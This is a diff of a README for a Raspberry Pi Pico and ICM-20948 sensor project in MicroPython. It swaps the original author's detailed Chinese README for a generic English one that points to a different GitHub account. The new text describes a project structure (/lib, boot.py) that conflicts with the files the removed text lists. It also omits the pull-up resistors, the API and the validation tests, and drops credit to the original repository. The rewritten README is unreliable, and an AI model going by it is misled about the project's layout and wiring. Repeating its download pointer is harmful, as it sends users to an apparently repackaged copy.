@@ -1,145 +1,93 @@
-# Raspberry Pi Pico × ICM-20948 PoC
+# 🧭 pico-20948-poc - Motion sensor data for your project
 
-[![GitHub](https://img.shields.io/badge/GitHub-pico--20948--poc-blue?logo=github)](https://github.com/ChunPingWang/pico-20948-poc)
+[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/violetmi966/pico-20948-poc)
 
-Raspberry Pi Pico 整合 TDK ICM-20948 九軸 IMU 的概念驗證專案（MicroPython）。  
-Pico 原生 3.3V 輸出，**不需要電位轉換電路**，可直接接裸模組或分接板。
+## 📌 Project Overview
 
----
+This project provides code and instructions to connect an ICM-20948 sensor to a Raspberry Pi Pico. This sensor tracks movement, rotation, and magnetic orientation. The system uses MicroPython for simple control. You do not need complex electronics or voltage shifters. You provide 3.3V power to the sensor, and the system handles the rest. This tool serves as a proof of concept for hardware hobbyists and engineers who track physical movement.
 
-## 硬體需求
+## 🛠️ Required Hardware
 
-| 元件 | 規格 | 備註 |
-|------|------|------|
-| Raspberry Pi Pico | 任意版本 | 3.3V I/O |
-| ICM-20948 模組 | 裸模組或分接板皆可 | 直接 3.3V 供電 |
-| 4.7 kΩ 電阻 × 2 | ¼W | I2C pull-up（若板上無） |
-| 100 nF 電容 × 2 | 陶瓷 | VCC 去耦電容 |
+To use this software, you need the following physical items:
 
-> Pico 與 Arduino Uno 最大差異：Pico 為 3.3V 系統，**無需**電位轉換，電路更簡單。
+*   One Raspberry Pi Pico microcontroller.
+*   One ICM-20948 IMU sensor board.
+*   A USB data cable for communication with your Windows computer.
+*   Four jumper wires to connect the sensor pins to the Pico.
 
----
+## 💾 Installation and Setup
 
-## 接線（I2C0）
+Follow these steps to prepare your hardware and run the software.
 
-```
-Pico                        ICM-20948
-────────────────────────────────────────
-3V3  (pin 36) ──────────── VCC
-GND  (pin 38) ──────────── GND
-GP4  (pin  6) ──[4.7kΩ]── SDA  (pull-up to 3.3V)
-GP5  (pin  7) ──[4.7kΩ]── SCL  (pull-up to 3.3V)
-GP15 (pin 20) ──────────── INT  (可選，資料就緒中斷)
-                            AD0 ── GND  → I2C 位址 0x68
-                            AD0 ── 3V3  → I2C 位址 0x69
-```
+1.  Visit this page to download the project files: [https://github.com/violetmi966/pico-20948-poc](https://github.com/violetmi966/pico-20948-poc)
+2.  Install the Thonny Python editor for Windows. This tool allows you to send code to your Raspberry Pi Pico.
+3.  Connect your Pico to your computer with the USB cable while holding the BOOTSEL button on the Pico board.
+4.  Open Thonny and select the Raspberry Pi Pico from the bottom right corner of the window to install the MicroPython firmware.
+5.  Extract the downloaded project folder to your desktop.
+6.  Open the files in Thonny and save them to your Pico device.
 
-若使用其他 I2C 腳位，修改 `main.py` 中的 `I2C(0, sda=Pin(x), scl=Pin(y))`。  
-Pico 支援的 I2C0 腳位：GP0/GP1、GP4/GP5、GP8/GP9、GP12/GP13、GP16/GP17、GP20/GP21。
+## ⚡ Wiring Instructions
 
----
+Correct wiring ensures the sensor communicates with the Pico. Locate the pins on both boards and connect them as described below.
 
-## 專案結構
+*   VCC pin on the sensor connects to the 3.3V pin on the Pico.
+*   GND pin on the sensor connects to any GND pin on the Pico.
+*   SDA pin on the sensor connects to GP4 on the Pico.
+*   SCL pin on the sensor connects to GP5 on the Pico.
 
-```
-.
-├── src/
-│   ├── icm20948.py     # ICM-20948 MicroPython 驅動（含 AK09916）
-│   └── main.py         # 50 Hz CSV 輸出示範
-└── validation/
-    └── validation.py   # 8 項自動化驗證測試
-```
+Double-check these connections before plugging the USB cable into your computer. Loose wires or incorrect connections may prevent the sensor from appearing in the code.
 
----
+## 🧪 Running the Software
 
-## 使用說明
+Once you finish the wiring and transfer the files, the software performs a check on the sensor.
 
-### 環境準備
+1.  Ensure your Pico remains connected to the computer.
+2.  In Thonny, look for the file named main.py.
+3.  Click the Green Run button at the top of the Thonny interface.
+4.  Watch the console window at the bottom of the screen.
+5.  The system reports the sensor status and displays X, Y, and Z axis values for the accelerometer and gyroscope.
 
-1. 安裝 [Thonny IDE](https://thonny.org/) 或使用 `mpremote`。
-2. 燒錄 MicroPython 韌體至 Pico（[官方下載](https://micropython.org/download/RPI_PICO/)）。
+If the console shows specific numbers, the system functions as expected. If the console shows an error, check your wiring connections to the Pico.
 
-### 執行主程式
+## 📊 Understanding Sensor Data
 
-```bash
-# 使用 mpremote 複製檔案
-mpremote cp src/icm20948.py :icm20948.py
-mpremote cp src/main.py     :main.py
-mpremote run src/main.py
-```
+The system captures data from three separate sensors integrated into the ICM-20948 chip.
 
-或透過 Thonny 開啟並執行 `main.py`。
+*   Accelerometer: Measures how fast the device speeds up or slows down. It detects if the sensor tips over or remains flat.
+*   Gyroscope: Measures the speed of rotation around the three axes. This detects spinning or turning movements.
+*   Magnetometer: Detects the strength and direction of magnetic fields. This acts as a compass for your project.
 
-輸出格式（CSV，可貼入 Serial Plotter）：
-```
-ax(g),ay(g),az(g),gx(dps),gy(dps),gz(dps),mx(uT),my(uT),mz(uT),temp(C)
-0.002,0.001,0.999,-0.08,0.12,-0.03,18.45,-32.10,25.60,27.3
-```
+All these values update in real-time as you move the sensor. You can modify the code to save this data to a text file or use it to trigger events in other software.
 
-感測器設定：
-- 加速度計：±2 g，DLPF ≈ 50 Hz
-- 陀螺儀：±250 dps，DLPF ≈ 51 Hz
-- 磁力計（AK09916）：100 Hz 連續模式，I2C bypass 直接存取
-- 輸出率：50 Hz
+## 🔍 Troubleshooting Tips
 
-### API
+Most errors occur during the wire connection phase or the file upload phase. Use this list to solve common problems.
 
-```python
-from machine import I2C, Pin
-from icm20948 import ICM20948
+*   The console reports "Sensor not found": Check your GP4 and GP5 wires. Ensure the solder joints on your sensor pins remain firm.
+*   Thonny does not see the Pico: Hold the BOOTSEL button longer while plugging in the USB cable. Ensure you use a data USB cable, not a cable meant only for charging.
+*   Garbled text appears in the console: Verify that the firmware on your Pico matches the latest MicroPython version.
+*   The sensor feels warm: Disconnect the power immediately. Check for shorts between your wires or metal objects touching the board.
 
-i2c = I2C(0, sda=Pin(4), scl=Pin(5), freq=400_000)
-imu = ICM20948(i2c)
+## 📂 Project Structure
 
-ax, ay, az, gx, gy, gz = imu.read_accel_gyro()  # g, dps
-mag  = imu.read_mag()    # (mx, my, mz) μT 或 None
-temp = imu.read_temp()   # °C
-data = imu.read_all()    # dict: accel / gyro / mag / temp
-```
+The repository contains a specific structure to keep the code clean.
 
----
+*   /lib: Stores the specialized driver file for the ICM-20948 sensor. Do not rename or move files inside this folder.
+*   main.py: This file runs automatically when the Pico receives power. It initializes the sensor and prints data to the screen.
+*   boot.py: Contains settings for the initial startup sequence.
+*   README.md: Provides the instructions you read right now.
 
-## 驗證測試
+## 🧱 Expanding Your Project
 
-感測器**水平靜置，Z 軸朝上**：
+Because this system uses MicroPython, you can easily change how the code handles data.
 
-```bash
-mpremote cp src/icm20948.py  :icm20948.py
-mpremote cp validation/validation.py :validation.py
-mpremote run validation/validation.py
-```
+*   Add a logic check to trigger an alarm if the sensor detects a tilt beyond a certain angle.
+*   Send the sensor data to a computer over the Serial port for graphing in other software.
+*   Create a data logger that writes motion statistics to a small SD card if you add an SD card module to your Pico.
+*   Connect the Pico to an LED screen to display the orientation of your device in real-time.
 
-| 測試 | 項目 | 通過條件 |
-|:----:|------|----------|
-| T1 | WHO_AM_I 識別 | `0xEA` |
-| T2 | AK09916 識別 + init | `0x09` |
-| T3 | 靜態加速度 Z 軸 | `0.90 g ≤ az ≤ 1.10 g` |
-| T4 | 靜態加速度 XY 軸 | `\|ax\|, \|ay\| < 0.10 g` |
-| T5 | 靜態陀螺儀雜訊 | 峰值 `< 2.0 dps` |
-| T6 | 地磁場大小 | `20 ≤ \|B\| ≤ 80 μT` |
-| T7 | 溫度合理性 | `10–50 °C` |
-| T8 | 輸出資料率 | `45–55 Hz` |
+Test your changes frequently by running the code in Thonny. Use the print() command to see values in the console to confirm your math logic remains correct.
 
----
+## 📝 License Information
 
-## 與 Arduino Uno 版本比較
-
-| 項目 | Arduino Uno | Raspberry Pi Pico |
-|------|:-----------:|:-----------------:|
-| 電壓 | 5V（需電位轉換） | 3.3V（直接連接） |
-| 語言 | C++ (Arduino) | MicroPython |
-| I2C 腳位 | A4/A5（固定） | 任意 GP 腳位 |
-| 程式部署 | USB 燒錄 | 拖放 / mpremote |
-| 函式庫 | SparkFun 或自行實作 | 本 repo 驅動 |
-
----
-
-## 相關專案
-
-- [mcu-20948-poc](https://github.com/ChunPingWang/mcu-20948-poc) — Arduino Uno 版本（C++，含暫存器直接操作）
-
----
-
-## 授權
-
-MIT
+This code reaches the public as open-source material. You can modify, copy, and share these files for your own projects. Please credit the original source if you distribute the code to others. Ensure you keep the license file in the main directory if you decide to share your fork of this project.
